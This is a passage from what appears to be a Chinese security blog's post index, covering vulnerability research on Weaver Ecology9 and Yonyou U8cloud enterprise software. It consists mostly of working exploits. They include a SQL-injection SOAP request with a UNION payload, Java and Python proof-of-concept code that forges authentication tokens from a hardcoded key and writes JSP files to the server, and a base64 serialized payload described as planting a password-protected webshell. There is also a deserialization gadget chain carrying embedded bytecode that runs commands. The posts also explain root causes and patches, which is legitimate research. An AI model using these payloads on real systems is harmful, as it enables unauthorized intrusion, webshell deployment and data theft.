必须，存放实际调用的参数或返回值 --&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;\n\n一般来说长这样：\nPOST /services/BlogService HTTP/1.1Host: example.comContent-Type: text/xml; charset=utf-8&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;                  xmlns:blog=&quot;http://example.com/blog&quot;&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;blog:getBlog&gt;         &lt;blogId&gt;123&lt;/blogId&gt;      &lt;/blog:getBlog&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n这里代表调用getBlog方法，参数为blogId。\n其响应可能长：\n&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  &lt;soap:Body&gt;    &lt;getBlogResponse xmlns=&quot;http://example.com/blog&quot;&gt;      &lt;title&gt;Hello World&lt;/title&gt;      &lt;content&gt;First blog content...&lt;/content&gt;    &lt;/getBlogResponse&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;\n\nWSDL文档WSDL，即 Web Services Description Language ，它的作用是提供了一份接口调用说明书，就是告诉我们能够调用哪些方法，里面的参数是什么。\n我们可以通过GET请求+?wsdl 的方式来查看：\n\n主要包含五个部分：\n\ntypes定义数据类型（类似 Java 类或数据库字段）。\nmessage定义每个方法的输入输出消息结构。\nportType定义 WebService 提供的具体操作（方法名 + 输入输出消息）。\nbinding指定协议和数据格式（如 SOAP 1.1&#x2F;1.2）。\nservice定义服务端点 URL。\n\ntypes：告诉方法和参数\n&lt;xsd:element name=&quot;writeBlogReadFlag&quot;&gt;&lt;xsd:complexType&gt;&lt;xsd:sequence&gt;&lt;xsd:element maxOccurs=&quot;1&quot; minOccurs=&quot;1&quot; name=&quot;in0&quot; nillable=&quot;true&quot; type=&quot;xsd:string&quot;/&gt;&lt;xsd:element maxOccurs=&quot;1&quot; minOccurs=&quot;1&quot; name=&quot;in1&quot; nillable=&quot;true&quot; type=&quot;xsd:string&quot;/&gt;&lt;xsd:element maxOccurs=&quot;1&quot; minOccurs=&quot;1&quot; name=&quot;in2&quot; nillable=&quot;true&quot; type=&quot;xsd:string&quot;/&gt;&lt;/xsd:sequence&gt;&lt;/xsd:complexType&gt;\n\nmessage：每个方法对应的请求和响应\n&lt;wsdl:message name=&quot;writeBlogReadFlagResponse&quot;&gt;  &lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:writeBlogReadFlagResponse&quot;&gt;  &lt;/wsdl:part&gt;&lt;/wsdl:message&gt;&lt;wsdl:message name=&quot;writeBlogReadFlagRequest&quot;&gt;  &lt;wsdl:part name=&quot;parameters&quot; element=&quot;tns:writeBlogReadFlag&quot;&gt;  &lt;/wsdl:part&gt;&lt;/wsdl:message&gt;\n\nportType：就是把上面合起来了\n&lt;wsdl:operation name=&quot;writeBlogReadFlag&quot;&gt;  &lt;wsdl:input name=&quot;writeBlogReadFlagRequest&quot; message=&quot;tns:writeBlogReadFlagRequest&quot;&gt;&lt;/wsdl:input&gt;  &lt;wsdl:output name=&quot;writeBlogReadFlagResponse&quot; message=&quot;tns:writeBlogReadFlagResponse&quot;&gt;&lt;/wsdl:output&gt;&lt;/wsdl:operation&gt;\n\nbinding：\n&lt;wsdl:operation name=&quot;writeBlogReadFlag&quot;&gt;  &lt;wsdlsoap:operation soapAction=&quot;&quot;/&gt;  &lt;wsdl:input name=&quot;writeBlogReadFlagRequest&quot;&gt;    &lt;wsdlsoap:body use=&quot;literal&quot;/&gt;  &lt;/wsdl:input&gt;  &lt;wsdl:output name=&quot;writeBlogReadFlagResponse&quot;&gt;    &lt;wsdlsoap:body use=&quot;literal&quot;/&gt;  &lt;/wsdl:output&gt;&lt;/wsdl:operation&gt;\n\nservice：\n&lt;wsdl:service name=&quot;BlogService&quot;&gt;  &lt;wsdl:port name=&quot;BlogServiceHttpPort&quot; binding=&quot;tns:BlogServiceHttpBinding&quot;&gt;    &lt;wsdlsoap:address location=&quot;http://127.0.0.1:8090/services/BlogService&quot;/&gt;  &lt;/wsdl:port&gt;&lt;/wsdl:service&gt;\n\n漏洞分析WebService的类应该都在classbean里面，\\ecology\\classbean\\weaver\\blog\\webservices\\BlogServiceImpl.class\n从wsdl文档中，我们知道可以调用writeBlogReadFlag方法。\nweaver.blog.webservices.BlogServiceImpl#writeBlogReadFlag\n\n跟进addReadRecord，其中两个参数都是我们可控的：\n很简单的拼接。\n但是不知道为什么，我这里打不通，可能是安全补丁生效了。\n然后这里还有一些其他漏洞点。\n比如说weaver.blog.webservices.BlogServiceImpl#getMenuItemCount\n\n调用了weaver.blog.BlogDao#getRemindUnReadCount\n\n这里也是拼接可控。\nwsdl也是给了调用的：\n\n反正Dao类里面，有很多地方都是直接拼接的，都可以尝试利用。\n&#x2F;services&#x2F;workflowservicexmlhttps://sn1per-ssd.github.io/2024/08/15/ecology9%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/\n也是一个WebService接口\n\n主要是控制i4，最后调用getWorkflowRequestList会执行sql查询。不过这里我还是没复现成功，响应码一直是500\n最终的语句是这样的，在var4处自行拼接即可，不过不清楚过滤机制，有些会被过滤：\nSELECT DISTINCT t1.createdate, t1.createtime, t1.creater, t1.currentnodeid, t1.currentnodetype        , t1.lastoperator, t1.creatertype, t1.lastoperatortype, t1.lastoperatedate, t1.lastoperatetime        , t1.requestid, t1.requestname, t1.requestlevel, t1.workflowid, t2.receivedate        , t2.receivetimeFROM workflow_requestbase t1, workflow_currentoperator t2WHERE t1.requestid = t2.requestid        AND t2.usertype = 0        AND t2.userid = &#123;var4&#125;        AND t2.isremark = &#x27;2&#x27;        AND t2.iscomplete = 0        AND t2.islasttimes = 1        AND &#123;var5&#125;ORDER BY t2.receivedate DESC, t2.receivetime DESC, t1.requestid DESCLIMIT 1;\n\nexp：\nPOST /services/WorkflowServiceXml HTTP/1.1Host: 127.0.0.1:8090Cache-Control: max-age=0sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:8090/Accept-Encoding: gzip, deflate, brCookie: ecology_JSessionid=aaaTFu27tf_OB7M3KLrIz; JSESSIONID=aaaTFu27tf_OB7M3KLrIz; __randcode__=a5cddb6a-5dc6-4cab-a850-d79303048e8fIf-None-Match: &quot;6VlXQDoaXNs&quot;If-Modified-Since: Fri, 08 Aug 2025 01:39:01 GMTConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 615&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:web=&quot;http://webservices.workflow.weaver&quot;&gt; &lt;soapenv:Header/&gt;  &lt;soapenv:Body&gt;      &lt;web:getHendledWorkflowRequestList&gt;        &lt;web:in0&gt;1&lt;/web:in0&gt;        &lt;web:in1&gt;1&lt;/web:in1&gt;        &lt;web:in2&gt;1&lt;/web:in2&gt;        &lt;web:in3&gt;1&lt;/web:in3&gt;        &lt;web:in4&gt;            &lt;web:string&gt;1=1 UNION SELECT CONCAT(0x616263,database(),0x646667),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&lt;/web:string&gt;        &lt;/web:in4&gt;      &lt;/web:getHendledWorkflowRequestList&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"用友U8cloud-ServiceDispacherServlet反序列化","url":"/2025/08/16/%E7%94%A8%E5%8F%8BU8cloud-ServiceDispacherServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"影响版本2.0 2.1 2.3 2.5 2.6 2.7 2.65 3.0 3.1 3.2 3.5 3.6 3.6sp 5.0 5.0sp 5.1 5.1sp\npoc需要提前把库添加到idea，不然会找不到nc相关类\nimport nc.bs.framework.common.InvocationInfo;import nc.bs.framework.comn.NetObjectOutputStream;import nc.bs.framework.exception.FrameworkRuntimeException;import nc.bs.framework.server.token.MD5Util;import java.io.*;import java.net.HttpURLConnection;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.security.MessageDigest;import java.util.Base64;import java.util.zip.ZipEntry;import java.util.zip.ZipOutputStream;public class ServiceDispatcherServlet &#123;    public static void main(String[] args) throws Exception &#123;        byte[] data = createData(&quot;./1.jsp&quot;);//        new FileOutputStream(&quot;./data&quot;).write(data);        String userCode = &quot;1&quot;;        String service = &quot;nc.itf.hr.tools.IFileTrans&quot;;        String method = &quot;uploadFile&quot;;        Class[] classes = &#123;byte[].class, String.class&#125;;        Object[] params = &#123;data, &quot;D:/1.jspp&quot;&#125;;        InvocationInfo invocationInfo = new InvocationInfo(service, method, classes, params);        invocationInfo.setUserCode(userCode);        invocationInfo.setToken(genToken(userCode));        FileOutputStream fos = new FileOutputStream(&quot;./ser1.bin&quot;);        NetObjectOutputStream.writeObject(fos, invocationInfo);        post();//        byte[] bytes = Files.readAllBytes(Paths.get(&quot;./ser1.bin&quot;));//        String s = Base64.getEncoder().encodeToString(bytes);//        System.out.println(s);//        String s1 = genToken(&quot;1&quot;);//        System.out.println(s1);    &#125;    public static byte[] createData(String filePath) throws IOException &#123;        File file = new File(filePath);        byte[] fileBytes = new byte[(int) file.length()];        FileInputStream fis = new FileInputStream(file);        fis.read(fileBytes);        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ZipOutputStream zos = new ZipOutputStream(baos);        ZipEntry entry = new ZipEntry(&quot;compressed&quot;);        zos.putNextEntry(entry);        zos.write(fileBytes);        zos.closeEntry();        zos.close();        return baos.toByteArray();    &#125;    private static byte[] md5(byte[] key, byte[] tokens) &#123;        MessageDigest md = null;        try &#123;            md = MessageDigest.getInstance(&quot;SHA-1&quot;);            md.update(tokens);            md.update(key);            return md.digest();        &#125; catch (Exception var5) &#123;            Exception e = var5;            throw new FrameworkRuntimeException(&quot;md5 error&quot;, e);        &#125;    &#125;    public static String genToken(String userCode) &#123;        byte[] md5 = md5(&quot;ab7d823e-03ef-39c1-9947-060a0a08b931&quot;.getBytes(), userCode.getBytes());        return MD5Util.byteToHexString(md5);    &#125;    public static void post() throws Exception &#123;        // 目标 URL        URL url = new URL(&quot;http://127.0.0.1:8051/ServiceDispatcherServlet&quot;);        HttpURLConnection conn = (HttpURLConnection) url.openConnection();        // 配置请求        conn.setRequestMethod(&quot;POST&quot;);        conn.setDoOutput(true);        conn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;);        // 从 ser1.bin 读取序列化数据        File file = new File(&quot;./ser1.bin&quot;);        byte[] data = new byte[(int) file.length()];        FileInputStream fis = new FileInputStream(file);        fis.read(data);        // 写入请求体        try (OutputStream os = conn.getOutputStream()) &#123;            os.write(data);            os.flush();        &#125;        // 读取响应        try (InputStream is = conn.getInputStream();             BufferedReader br = new BufferedReader(new InputStreamReader(is))) &#123;            String line;            while ((line = br.readLine()) != null) &#123;                System.out.println(line);            &#125;        &#125;        conn.disconnect();    &#125;&#125;\n\n没有环境的话，就用这个python的\nimport base64import requestsif __name__ == &quot;__main__&quot;:    # 创建 webapps/u8c_web/a1b1.jsp 内容：test321    touch = &quot;AAACDHJxiQF7uQPbFPuWMWS63hJKY0Wrr6QW0Rp3mKSWQODMh32wwokYgFxrSBJebabPcsPNLdxM0ggqZIJL/BR02TCwGFNuhaf7kixQNGfbpGTZePjlZ2+dptAdZnQPVlY9T8SoekSLXJf9eaEyU2vGDbD5KjXKh7coPKCKCfWKc30Kq9UVWyKc3e7xUXypmRj+uQI4Nr4rH44HG+CubNiqmEv0Vt4zvEoDGOfcmY1+qx8DBTmzUAONkQEN9HuZ7BL3x2eAR3K0y2Tl47IluOgj5Oo8ormLsPPcSHPa9a7kh/hVe4Dv2cpOKWdt+eltcxs+fZqWuxlRzFm4DET8b/pLKY/jvSVTbyYT4qEnH8XggqXp4wD88i6GJ83m9U3hp3WmSQDFm0y3TYs1VrcDoGsWImZOMJXyUu1NmlfZ7STBdr7AoTNGO9GLkSY9i/x4eNAzaSH9jq8HIdzA1PfeDsGLdQy7DquK0V9qO/8q7+35AtbE6uLL7/dbRKDWw2EPig4s7e4p3s+XxWgjv+Palcv7tTm8lo9AAThuVGvYZXKwccpm721hSEjsfsaEiqMgcfgQYdCvgtmueSEkWlZACvkC1sTq4svv+QLWxOriy+9ubVc8v+j+6yurlS6SjLoFy2WseGEpNut1F4D9ZvPMsvIBVP3XH7ey+M0H6WtY5pRHApZtejNldPRUQJbHkuLQ&quot;    # 创建 webapps/u8c_web/evil.jsp 连接密码：passwd  用蚁剑！    shell = &quot;AAADpHJxiQF7uQPbFPuWMWS63hJKY0Wrr6QW0Rp3mKSWQODMh32wwokYgFxrSBJebabPcsPNLdxM0ggqZIJL/BR02TCwGFNuhaf7kixQNGfbpGTZePjlZ2+dptAdZnQPVlY9T8SoekSLXJf9eaEyU2vGDbD5KjXKh7coPKCKCfWKc30Kq9UVWyKc3e7xUXypmRj+uQI4Nr4rH44HG+CubNiqmEv0Vt4zvEoDGOfcmY1+qx8DBTmzUAONkQEN9HuZF8gOZXBV42naCRCtoBMMZegj5Oo8ormLsPPcSHPa9a7kh/hVe4Dv2cpOKWdt+eltcxs+fZqWuxlRzFm4DET8b/pLKY/jvSVTbyYT4qEnH8XggqXp4wD88i6GJ83m9U3hp3WmSQDFm0y3TYs1VrcDoGsWImZOMJXyUu1NmlfZ7STBdr7AoTNGO9GLkSY9i/x4eNAzaSH9jq/9RuGwMKypDcGLdQy7DquKPEP8EXryeIT5AtbE6uLL7/dbRKDWw2EPig4s7e4p3s/23GiyUof4BwNejVIJiEfvfsGlfQ5wuDcoqF//OWcXePrJ6eJwMvIc9F619/+pu5ZT8P7uF/GIXtOxYN6fZH/qauVX12sOZvEJ+2imWsQR0QPVbUYD6CpnNFZzNNeqnbiz1gF5dl+NYYXfPFf1gRH0iaZO3F09ADqB8VP6Ejf0lTMSWQYbs/2Uoo9b2TkrEMx+GAqu5qW0E39MTadUNctN3M4LHNeD0WSIHwnd8dyQ0rVPBOdfVlY/0b9/9vfdvyahASonlXPk9j6PdykcudJ6Q2ZsV1hqcYuVw7/EkaOqseFSuR305uHIBPXUloD9UiLwO7vfRAZgCgD5MNcA5qjqQXHd5JSZSpRyIUo/+ebGBuFcqsO8O0TQiXvcnO3E2cSFlCja0yOUJ2126pCoxWg1uOGpNeqO7wZoWrEt8rdZnTx4WKR7es8y+pT5W1UrTy+rkI3C/RtPf+OLUuMkzwLvUUncAG7u+GLCHQFAiWBXc/51GCGbCTJjxgeGSaymmFWwUfnvasm6FFmMB/QIjfj/7kqGBlxlHKLzrSfOQWlkEw57KcLCk5+GGZ80mzJrxNArh2ZZd1d9j7QqzXntpyy+mpr7CHObop1QFcPbjYeuaPkC1sTq4svvpuJ4zlLP63c9dKA9wUDzHcrCqzVqVg+jHYrOoDMIMFWvbZegtMZtGbuYixqbK8LM6sWM+wj7CCrkqzmHKXShintmHtB8TuGt&quot;    ser = base64.b64decode(touch)    url = &quot;http://127.0.0.1:8051/ServiceDispatcherServlet&quot;    h = &#123;        &quot;token&quot;: &quot;4a68a59011d7341f5635100286d91965&quot;    &#125;    resp = requests.post(url=url, data=ser, headers=h)    print(resp.text)\n\n漏洞原理token鉴权可绕过；nc.bs.framework.comn.serv.ServiceDispatcher#invokeBeanMethod可调用能lookup到的类中的任意方法；nc.impl.hr.tools.trans.FileTransImpl#uploadFile写shell到webapps\n漏洞分析token伪造全局搜索，找到路由：\n\n访问&#x2F;ServiceDispatcherServlet后，后进入nc.bs.framework.comn.serv.CommonServletDispatcher#doGet，doGet最终会调用execCall：\n\n跟进，在execCall中，会对我们的请求体进行反序列化，不过指定了类型，只能反序列化为InvocationInfo，不过这里要记住，InvocationInfo中的所有字段都是我们可控的：\n\n之后在160行打断点，即token鉴权处：\n\n跟进去看一下鉴权：\n白名单校验过不了，会进入到nc.bs.framework.server.token.TokenUtil#vertifyTokenIllegal：\n\n根据反序列化得到的userCode来genToken，然后和我们请求头中的token进行比较。\n看一下genToken的逻辑：\n\n显然是可以伪造的。\n方法调用lookup到类后，反射取出方法，注意用的是getMethod，所以只能取出public方法，然后再invoke，用到的全部参数都是我们在序列化时自行写入的：\n\n文件写入这里用的是nc.impl.hr.tools.trans.FileTransImpl#uploadFile，esnserver接口漏洞的同一个类。因为如果对n8c不熟悉的话，找一个能用的类还是有难度的。所以，不妨去以前的老漏洞中拿一个用，这也是漏洞复现的意义。\n\n漏洞修复首先是tokenseed的文件改了：\n\n但是这个文件默认是不存在的，所以seed还是固定。\n二是增加了trustServiceList.conf，这个不知道有啥用：\n\n三是修改了nc.impl.hr.tools.trans.FileTransImpl#uploadFile，这是最关键的，不允许写入webapps了：\n\n参考用友U8Cloud最新前台RCE漏洞挖掘过程分享\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"用友U8cloud-esnserver接口RCE","url":"/2025/08/16/%E7%94%A8%E5%8F%8BU8cloud-esnserver%E6%8E%A5%E5%8F%A3RCE/","content":"影响版本1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp,5.1\npocimport ioimport zipfileimport base64import requestsdef create_data(file_path: str) -&gt; bytes:    # 读取文件内容    with open(file_path, &quot;rb&quot;) as f:        file_bytes = f.read()    # 创建内存字节流    baos = io.BytesIO()    # 写入 zip 文件    with zipfile.ZipFile(baos, &#x27;w&#x27;, zipfile.ZIP_DEFLATED) as zos:        # 注意，这里 entry 名称固定为 &quot;compressed&quot;        zos.writestr(&quot;compressed&quot;, file_bytes)    # 返回字节数组    return baos.getvalue()if __name__ == &quot;__main__&quot;:    url = &quot;http://127.0.0.1:8051/service/esnserver&quot;    heads = &#123;&quot;Token&quot;: &quot;469ce01522f64366750d1995ca119841&quot;&#125;    data = create_data(&quot;test.jsp&quot;)    encode_data = base64.b64encode(data).decode(&quot;utf8&quot;)    jsonstr = &#123;&quot;invocationInfo&quot;: &#123;&quot;ucode&quot;: &quot;123&quot;, &quot;dataSource&quot;: &quot;U8cloud&quot;, &quot;lang&quot;: &quot;en&quot;&#125;, &quot;method&quot;: &quot;uploadFile&quot;,               &quot;className&quot;: &quot;nc.itf.hr.tools.IFileTrans&quot;,               &quot;param&quot;: &#123;&quot;p1&quot;: encode_data, &quot;p2&quot;: &quot;D:/1.jsp&quot;&#125;,               &quot;paramType&quot;: [&quot;p1:[B&quot;, &quot;p2:java.lang.String&quot;]&#125;    resp = requests.post(url=url, json=jsonstr, headers=heads)    print(resp.text)\n\n漏洞原理token加密密钥硬编码，加密流程固定，可绕过鉴权；EsnServlet的调用链中，存在任意方法调用。其实不是任意方法，而是能被nc.bs.framework.common.NCLocator找到的类。\n漏洞分析访问&#x2F;service&#x2F;esnserver后，会进入EsnServlet，最终都会进入doAction。不知道为什么要访问这个路由的，看我之前写的环境搭建那篇文章。\n\n先会做一个json字符串的解析，然后把传入的内容存储到jsonObject中。\n然后会根据传入的invocationInfo进行一系列赋值，这里面最重要的是ucode，其他无所谓。\n接着进入token鉴权。tokenSeed就是上面传入的ucode，拼接后形成硬编码的密钥，然后调用com.nc.mobile.bo.DigestUtil#signatureByMD5计算token。所以我们完全可以伪造token来绕过鉴权。\n之后跟进service.processBusi：\n\n这里就是一个很典型的method.invoke任意方法调用。\n这里可以调用nc.impl.hr.tools.trans.FileTransImpl#uploadFile，实现任意写文件。不过要注意，文件的生成是有要求的：\n\n要和这里的解压过程相对应。\n漏洞修复限制反射调用的包名前缀：\n\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"用友U8cloud-LoginVideoServlet接口反序列化","url":"/2025/08/16/%E7%94%A8%E5%8F%8BU8cloud-LoginVideoServlet%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"影响版本3.6 3.6sp 5.0 5.0sp 5.1 5.1sp\npocimport com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.target.HotSwappableTargetSource;import java.awt.*;import java.io.*;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.List;public class FastJ &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templates = new TemplatesImpl();//        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:/1tmp/classes/CalcAbs.class&quot;));        // 弹出计算器        String calc = &quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMQ2FsY0FiczsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAMQ2FsY0Ficy5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAB0NhbGNBYnMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;;        byte[] bytes = Base64.getDecoder().decode(calc);        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        setFieldValue(templates, &quot;_name&quot;, null);        setFieldValue(templates, &quot;_class&quot;, null);        JSONArray toStringClass = new JSONArray();        toStringClass.add(templates);        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(toStringClass);        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(&quot;1&quot;));        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();        hashMap1.put(templates, hashMap);        setFieldValue(templates, &quot;_name&quot;, &quot;1diot9&quot;);        byte[] ser = ser(hashMap1);        Requests.post(&quot;http://127.0.0.1/service/LoginVideoServlet&quot;, ser);    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) &#123;        Class&lt;?&gt; aClass = obj.getClass();        try&#123;            Field field = aClass.getDeclaredField(fieldName);            field.setAccessible(true);            field.set(obj, value);        &#125; catch (NoSuchFieldException e) &#123;            aClass = aClass.getSuperclass();        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static void deser(byte[] bytes) throws IOException, ClassNotFoundException &#123;        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();    &#125;    public static byte[] ser(Object obj) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        oos.close();        byte[] bytes = baos.toByteArray();        Files.write(Paths.get(&quot;./fastj.bin&quot;), bytes);        return bytes;    &#125;    public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 )            throws Exception &#123;        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();        setFieldValue(s, &quot;size&quot;, 2);        Class&lt;?&gt; nodeC;        try &#123;            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);        &#125; catch (ClassNotFoundException e) &#123;            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class,                Object.class, Object.class, nodeC);        nodeCons.setAccessible(true);        Object tbl = Array.newInstance(nodeC, 2);        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));        setFieldValue(s, &quot;table&quot;, tbl);        return s;    &#125;&#125;import java.io.*;import java.net.HttpURLConnection;import java.net.URL;public class Requests &#123;    public static void post(String host, byte[] data) throws Exception &#123;        // 目标 URL        URL url = new URL(host);        HttpURLConnection conn = (HttpURLConnection) url.openConnection();        // 配置请求        conn.setRequestMethod(&quot;POST&quot;);        conn.setDoOutput(true);        conn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;);        // 从 ser1.bin 读取序列化数据//        File file = new File(&quot;./ser1.bin&quot;);//        byte[] data = new byte[(int) file.length()];//        FileInputStream fis = new FileInputStream(file);//        fis.read(data);        // 写入请求体        try (OutputStream os = conn.getOutputStream()) &#123;            os.write(data);            os.flush();        &#125;        // 读取响应        try (InputStream is = conn.getInputStream();             BufferedReader br = new BufferedReader(new InputStreamReader(is))) &#123;            String line;            while ((line = br.readLine()) != null) &#123;                System.out.println(line);            &#125;        &#125;        conn.disconnect();    &#125;&#125;\n\n\n\n漏洞原理很直接的反序列化，只不过要绕一下黑名单和白名单\n漏洞分析通过everything查找，找到对应的路由：\n\n或者用之前调试时得到的映射关系，不知道的话去看我之前的文章\n用友U8Cloud环境搭建 | 1diot9’s 